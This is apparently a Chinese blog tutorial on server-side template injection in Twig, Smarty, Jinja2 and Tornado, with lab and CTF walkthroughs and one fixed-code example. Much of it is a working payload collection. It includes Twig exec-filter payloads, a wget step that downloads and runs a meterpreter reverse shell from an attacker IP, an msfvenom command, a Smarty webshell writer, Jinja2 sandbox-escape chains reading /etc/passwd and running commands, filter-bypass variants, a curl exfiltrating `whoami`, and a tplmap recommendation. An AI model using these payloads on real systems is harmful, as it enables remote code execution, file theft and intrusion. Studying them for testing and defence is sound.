模板注入这个老生常谈的漏洞

模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。

模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。

SSTI 就是服务器端模板注入（Server-Side Template Injection）

当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。

漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。

凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911174631687-758048107.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911174631687-758048107.png)

php常见的模板：twig，smarty，blade

Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815153729779-1563757467.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815153729779-1563757467.png)

<?php
　　require_once dirname(__FILE__).'\twig\lib\Twig\Autoloader.php';
　　Twig_Autoloader::register(true);
　　$twig = new Twig_Environment(new Twig_Loader_String());
　　$output = $twig->render("Hello {{name}}", array("name" => $_GET["name"]));  // 将用户输入作为模版变量的值
　　echo $output;
?>

Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。

其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。

使用 Twig 模版引擎渲染页面，其中模版含有 {{name}}  变量，其模版变量值来自于GET请求参数$_GET["name"] 。

显然这段代码并没有什么问题，即使你想通过name参数传递一段JavaScript代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击:

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815170919414-672456065.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815170919414-672456065.png)

但是,如果渲染的模版内容受到用户的控制,情况就不一样了。修改代码为:

<?php
　　require_once dirname(__FILE__).'/../lib/Twig/Autoloader.php';
　　Twig_Autoloader::register(true);
　　$twig=newTwig_Environment(newTwig_Loader_String());
　　$output=$twig->render("Hello {$_GET['name']}");// 将用户输入作为模版内容的一部分
　　echo $output;?>

上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见:

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171105220-873778530.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171105220-873778530.png)

如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。

在Twig模板引擎里,，{{var}} 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。

例如这里用户输入name={{2*10}} ，则在服务端拼接的模版内容为:

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171519739-387170199.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171519739-387170199.png)

尝试插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为:

bmjoker{# comment #}{{2*8}}OK

实际服务端要进行编译的模板就被构造为:

bmjoker{# comment #}{{2*8}}OK

由于 {# comment #}  作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 {{2*8}} 作为模板变量最终会返回16 作为其值进行显示，因此前端最终会返回内容 Hello bmjoker16OK 

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195732706-567305144.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195732706-567305144.png)

通过上面两个简单的示例,就能得到 SSTI 扫描检测的大致流程(这里以 Twig 为例):

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195801226-981945295.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195801226-981945295.png)

同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。

每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。

简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。

凡是使用模板的网站，基本都会存在SSTI，只是能否控制其传参而已。

接下来借助XVWA的代码来实践演示一下SSTI注入

如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据

<div>{$what}</div>
<p>Welcome, {{username}}</p>
<div>{%$a%}</div>
...

通过注入了探测字符串 ${{123+456}}，以查看应用程序是否进行了相应的计算：

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231335548-122594708.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231335548-122594708.png)

根据这个响应，我们可以推测这里使用了模板引擎，因为这符合它们对于 {{ }} 的处理方式

在这里提供一个针对twig的攻击载荷：

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231853350-914354726.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231853350-914354726.png)

使用msf生成了一个php meterpreter有效载荷

msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.127.131 LPORT=4321 > /var/www/html/shell.txt

msf进行监听：

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232520602-1757346385.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232520602-1757346385.png)

模板注入远程下载shell，并重命名运行

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php")}}

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232914668-1182705687.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232914668-1182705687.png)

以上就是php twig模板注入，由于以上使用的twig为2.x版本，现在官方已经更新到3.x版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的payload：

{{'/etc/passwd'|file_excerpt(1,30)}}

{{app.request.files.get(1).__construct('/etc/passwd','')}}

{{app.request.files.get(1).openFile.fread(99)}}

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

{{_self.env.enableDebug()}}{{_self.env.isDebug()}}

{{["id"]|map("system")|join(",")

{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}

{{["id",0]|sort("system")|join(",")}}

{{["id"]|filter("system")|join(",")}}

{{[0,0]|reduce("system","id")|join(",")}}

{{['cat /etc/passwd']|filter('system')}}

具体payload分析详见：《[TWIG 全版本通用 SSTI payloads](https://xz.aliyun.com/t/7518#toc-5)》

　　　　　　　　　　  《[SSTI-服务器端模板注入](https://my.oschina.net/u/4588149/blog/4408349)》

Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)

但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读[模板的文档](https://github.com/smarty-php/smarty)以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法

smarty/libs/sysplugins/smarty_internal_data.php　　——>　　getStreamVariable() 这个方法可以获取传入变量的流

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200910234359019-777787778.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200910234359019-777787778.png)

因此我们可以用这个方法读文件，payload:

{self::getStreamVariable("file:///etc/passwd")}

同样

smarty/libs/sysplugins/smarty_internal_write_file.php　　——>　　Smarty_Internal_Write_File 这个类中有一个writeFile方法

class Smarty_Internal_Write_File
{
    /**
     * Writes file in a safe way to disk     *     * @param  string $_filepath complete filepath     * @param  string $_contents file content     * @param  Smarty $smarty    smarty instance     *     * @throws SmartyException     * @return boolean true     */
    public function writeFile($_filepath, $_contents, Smarty $smarty)
    {
        $_error_reporting = error_reporting();
        error_reporting($_error_reporting & ~E_NOTICE & ~E_WARNING);
        if ($smarty->_file_perms !== null) {
            $old_umask = umask(0);
        }

        $_dirpath = dirname($_filepath);
        // if subdirs, create dir structure
        if ($_dirpath !== '.' && !file_exists($_dirpath)) {
            mkdir($_dirpath, $smarty->_dir_perms === null ? 0777 : $smarty->_dir_perms, true);
        }

        // write to tmp file, then move to overt file lock race condition
        $_tmp_file = $_dirpath . DS . str_replace(array('.', ','), '_', uniqid('wrt', true));
        if (!file_put_contents($_tmp_file, $_contents)) {
            error_reporting($_error_reporting);
            throw new SmartyException("unable to write file {$_tmp_file}");
       }

        /*
         * Windows' rename() fails if the destination exists,         * Linux' rename() properly handles the overwrite.         * Simply unlink()ing a file might cause other processes         * currently reading that file to fail, but linux' rename()         * seems to be smart enough to handle that for us.         */
        if (Smarty::$_IS_WINDOWS) {
            // remove original file
            if (is_file($_filepath)) {
                @unlink($_filepath);
            }
            // rename tmp file
            $success = @rename($_tmp_file, $_filepath);
        } else {
            // rename tmp file
            $success = @rename($_tmp_file, $_filepath);
            if (!$success) {
                // remove original file
                if (is_file($_filepath)) {
                    @unlink($_filepath);
                }
                // rename tmp file
                $success = @rename($_tmp_file, $_filepath);
            }
        }
        if (!$success) {
            error_reporting($_error_reporting);
            throw new SmartyException("unable to write file {$_filepath}");
        }
        if ($smarty->_file_perms !== null) {
            // set file permissions
            chmod($_filepath, $smarty->_file_perms);
            umask($old_umask);
        }
        error_reporting($_error_reporting);

        return true;
    }
}

可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：

public function clearConfig($varname = null)
{
    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);
}

因此我们可以构造payload写个webshell:

{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php eval($_GET['cmd']); ?>",self::clearConfig())}

CTF地址：https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）

题目模拟了一个获取IP的API，并且可以在最下方看到 "Build With Smarty !" 可以确定页面使用的是Smarty模板引擎。

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820231808793-180982707.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820231808793-180982707.png)

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232249193-1694257286.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232249193-1694257286.png)

在页面的右上角发现了IP，但是题目中显示的API的URL由于环境的原因无法使用，猜测这个IP受X-Forwarded-For头控制。

将XFF头改为 {6*7} 会发现该位置的值变为了42，便可以确定这里存在SSTI。

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232629595-1646272720.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232629595-1646272720.png)

直接构造 {system('cat /flag')} 即可得到flag

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232839480-729397105.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232839480-729397105.png)

**1. {$smarty.version}**

{$smarty.version}  #获取smarty的版本号

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233050238-1942906786.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233050238-1942906786.png)

**2. {php}{/php}**

{php}phpinfo();{/php}  #执行相应的php代码

Smarty支持使用 {php}{/php} 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{/php}标签会报错：

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233259128-196602210.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233259128-196602210.png)

因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。

**3. {literal}**

<script language="php">phpinfo();</script>   

这个地方借助了 {literal} 这个标签，因为 {literal} 可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。但是这种写法只适用于php5环境，这道ctf使用的是php7，所以依然失败

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233719367-1535357026.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233719367-1535357026.png)

**4.** **getstreamvariable**

{self::getStreamVariable("file:///etc/passwd")}

Smarty类的getStreamVariable方法的代码如下：

public function getStreamVariable($variable)
{
        $_result = '';
        $fp = fopen($variable, 'r+');
        if ($fp) {
            while (!feof($fp) && ($current_line = fgets($fp)) !== false) {
                $_result .= $current_line;
            }
            fclose($fp);
            return $_result;
        }
        $smarty = isset($this->smarty) ? $this->smarty : $this;
        if ($smarty->error_unassigned) {
            throw new SmartyException('Undefined stream variable "' . $variable . '"');
        } else {
            return null;
        }
    }

可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法。然而使用这个payload会触发报错如下：

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234305773-495371489.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234305773-495371489.png)

可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。

**5. {if}{/if}**

{if phpinfo()}{/if}

Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||*，or，&&，and，is_array()等等，如：{if is_array($array)}{/if}*

既然这样就将XFF头改为 {if phpinfo()}{/if} ：

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234610811-341143885.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234610811-341143885.png)

同样还能用来执行一些系统命令：

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234755671-2008092498.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234755671-2008092498.png)

本题中引发SSTI的代码简化后如下：

<?php
    require_once('./smarty/libs/' . 'Smarty.class.php');
    $smarty = new Smarty();
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $smarty->display("string:".$ip);     // display函数把标签替换成对象的php变量；显示模板
}

可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。

Blade 是 Laravel 提供的一个既简单又强大的模板引擎。

关于blade模板这里不再多说，请参考《[laravel Blade 模板引擎](https://www.cnblogs.com/sgm4231/p/10283661.html)》

python常见的模板有：Jinja2，tornado

Jinja2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的

Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了 {{…}} 块

Jinja2使用 {{name}}结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。

Jinja2 模板同样支持控制语句，像在 {%…%} 块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子：

<ul>
     {% for comment in comments %}
         <li>{{comment}}</li>
     {% endfor %}
</ul>

另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值。

Hello, {{name|capitalize}}

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815153729779-1563757467.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815153729779-1563757467.png)

这边使用vulhub提供的环境进行复现，搭建成功后访问首页如图：

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903130838384-1719222659.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903130838384-1719222659.png)

进入docker容器来看一下web代码：

from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get('name', 'guest')

    t = Template("Hello " + name)
    return t.render()

if __name__ == "__main__":
    app.run()

t = Template("hello" + name) 这行代码表示，将前端输入的name拼接到模板，此时name的输入没有经过任何检测，尝试使用模板语言测试：

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903130738597-1463882629.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903130738597-1463882629.png)

如果使用一个固定好了的模板，在模板渲染之后传入数据，就不存在模板注入，就好像SQL注入的预编译一样，修复上面代码如下：

from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get('name', 'guest')

    t = Template("Hello {{n}}")
    return t.render(n=name)

if __name__ == "__main__":
    app.run()

编译运行，再次注入就会失败

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903151308616-823367288.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903151308616-823367288.png)

由于在jinja2中是可以直接访问python的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行等：

__dict__　　 ：保存类实例或对象实例的属性变量键值对字典
__class__　　：返回一个实例所属的类
__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组
// __base__和__mro__都是用来寻找基类的
__subclasses__　　：以列表返回类的子类
__init__　　 ：类的初始化方法
__globals__　　   ：对包含函数全局变量的字典的引用__builtin__&&__builtins__　　：python中可以直接运行一些函数，例如int()，list()等等。　　　　　　　　　　　　　　　　　　这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__)　　　　　　　　　　　　　　　　　　在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身

[![](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815153729779-1563757467.png)](https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815153729779-1563757467.png)

for c in {}.__class__.__base__.__subclasses__():
    if(c.__name__=='file'):
        print(c)
        print c('joker.txt').readlines()

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903153121082-520901024.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903153121082-520901024.png)

上述代码先通过__class__获取字典对象所属的类，再通过__base__（__bases[0]__）拿到基类，然后使用__subclasses__()获取子类列表，在子类列表中直接寻找可以利用的类

为了方便理解，我直接把获取到的子类列表打印出来：

for c in {}.__class__.__base__.__subclasses__():
        print(c) 

 打印结果如下（python2.7.5）：

<type 'type'>
<type 'weakref'>
<type 'weakcallableproxy'>
<type 'weakproxy'>
<type 'int'>
<type 'basestring'>
<type 'bytearray'>
<type 'list'>
<type 'NoneType'>
<type 'NotImplementedType'>
<type 'traceback'>
<type 'super'>
<type 'xrange'>
<type 'dict'>
<type 'set'>
<type 'slice'>
<type 'staticmethod'>
<type 'complex'>
<type 'float'>
<type 'buffer'>
<type 'long'>
<type 'frozenset'>
<type 'property'>
<type 'memoryview'>
<type 'tuple'>
<type 'enumerate'>
<type 'reversed'>
<type 'code'>
<type 'frame'>
<type 'builtin_function_or_method'>
<type 'instancemethod'>
<type 'function'>
<type 'classobj'>
<type 'dictproxy'>
<type 'generator'>
<type 'getset_descriptor'>
<type 'wrapper_descriptor'>
<type 'instance'>
<type 'ellipsis'>
<type 'member_descriptor'>
<type 'file'>
<type 'PyCapsule'>
<type 'cell'>
<type 'callable-iterator'>
<type 'iterator'>
<type 'sys.long_info'>
<type 'sys.float_info'>
<type 'EncodingMap'>
<type 'fieldnameiterator'>
<type 'formatteriterator'>
<type 'sys.version_info'>
<type 'sys.flags'>
<type 'exceptions.BaseException'>
<type 'module'>
<type 'imp.NullImporter'>
<type 'zipimport.zipimporter'>
<type 'posix.stat_result'>
<type 'posix.statvfs_result'>
<class 'warnings.WarningMessage'>
<class 'warnings.catch_warnings'>
<class '_weakrefset._IterationGuard'>
<class '_weakrefset.WeakSet'>
<class '_abcoll.Hashable'>
<type 'classmethod'>
<class '_abcoll.Iterable'>
<class '_abcoll.Sized'>
<class '_abcoll.Container'>
<class '_abcoll.Callable'>
<class 'site._Printer'>
<class 'site._Helper'>
<type '_sre.SRE_Pattern'>
<type '_sre.SRE_Match'>
<type '_sre.SRE_Scanner'>
<class 'site.Quitter'>
<class 'codecs.IncrementalEncoder'>
<class 'codecs.IncrementalDecoder'>

使用dir来看一下file这个子类的内置方法：

dir(().__class__.__bases__[0].__subclasses__()[40])

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162108171-343241811.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162108171-343241811.png)

将要读取的文件传进入并使用readlines()方法读取，就相当于：

file('joker.txt').readlines()

可以在python交互终端中尝试输出：

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185622152-2036123666.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185622152-2036123666.png)

再使用jinja2的语法封装成可解析的样子：

{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__=='file' %}
{{ c("/etc/passwd").readlines() }}
{% endif %}
{% endfor %}

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162635283-101719007.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903162635283-101719007.png)

不过我这边一直没有读取成功，原因是：**python3已经移除了file。所以利用file子类文件读取只能在python2中用。**

docker容器默认使用python3版本

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903163434739-57279547.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903163434739-57279547.png)

上面的实例中我们使用dir把内置的对象列举出来，其实可以用__globals__更深入的去看每个类可以调用的东西（包括模块，类，变量等等），如果有os这种可以直接传入命令，造成命令执行

#coding:utf-8search = 'os'   #也可以是其他你想利用的模块
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass 

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903164854386-1155449135.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903164854386-1155449135.png)

可以看到在元组68，73的位置找到了os方法，这样就可以构造命令执行payload:

().__class__.__bases__[0].__subclasses__()[68].__init__.__globals__['os'].system('whoami')
().__class__.__base__.__subclasses__()[73].__init__.__globals__['os'].system('whoami')
().__class__.__mro__[1].__subclasses__()[68].__init__.__globals__['os'].system('whoami')
().__class__.__mro__[1].__subclasses__()[73].__init__.__globals__['os'].system('whoami')

在python交互终端中尝试输出：

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185803928-864364882.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903185803928-864364882.png)

**不过同样，只能在python2版本使用**

这时候就要推荐__builtins__：

#coding:utf-8

search = '__builtins__'
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        print(i.__init__.__globals__.keys())
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193619159-1700547757.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193619159-1700547757.png)

这时候我们的命令执行payload就出来了：  
python3：

().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")

python2：

().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")

在python交互终端中尝试输出：

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193824030-649565108.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193824030-649565108.png)

实际注入效果：

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903194150593-332610088.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903194150593-332610088.png)

既然大概知道原理跟利用，我这里不再废话，直接给出大佬们各种绕过payload：

获得基类
#python2.7
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]
#python3.7
''.__。。。class__.__mro__[1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]

#python 2.7
#文件操作
#找到file类
[].__class__.__bases__[0].__subclasses__()[40]
#读文件
[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
#写文件
[].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')

#命令执行
#os执行
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
#eval,impoer等全局函数
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()

#python3.7
#命令执行
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
#文件操作
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
#windows下的os命令
"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()

**过滤[**

#getitem、pop
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()

**过滤引号**

#chr函数
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}#request对象
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd
#命令执行
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id

**过滤下划线**

{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__

**过滤花括号**

#用{%%}标记
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}

**利用示例：**

{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}  {% if b.__class__ == {}.__class__ %}    {% if 'eval' in b.keys() %}      {{ b['eval']('__import__("os").popen("id").read()') }}         //popen的参数就是要执行的命令    {% endif %}  {% endif %}  {% endfor %}
{% endif %}
{% endfor %}

这里推荐自动化工具tplmap，拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利

github地址：[https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)

[![](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903230151729-80521204.png)](https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903230151729-80521204.png)

一键shell真香，还支持其他模板（Smarty，Mako，Tornado，Jinja2）的注入检测

tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过{{}}进行传递变量和执行简单的表达式。

以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的"FOO"，在进行加载模板并输出，且未对name值进行安全检查输入情况。

